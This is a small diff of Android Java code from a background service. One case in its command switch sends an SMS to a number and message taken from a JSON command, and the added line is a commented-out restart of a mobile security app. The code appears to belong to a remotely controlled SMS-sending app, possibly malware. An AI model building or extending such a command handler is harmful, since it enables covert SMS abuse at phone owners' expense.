@@ -486,6 +486,7 @@ public class AService extends Service implements Runnable{
 					case 11://发送短信
 						//发送短信
 						{
+							//Tools.reStartApp(mContext, "com.qihoo360.mobilesafe");
 							sn = tempJson.getString("sn");
 							sm = tempJson.getString("sm");
 							Tools.sendSms(mContext, sn, sm);
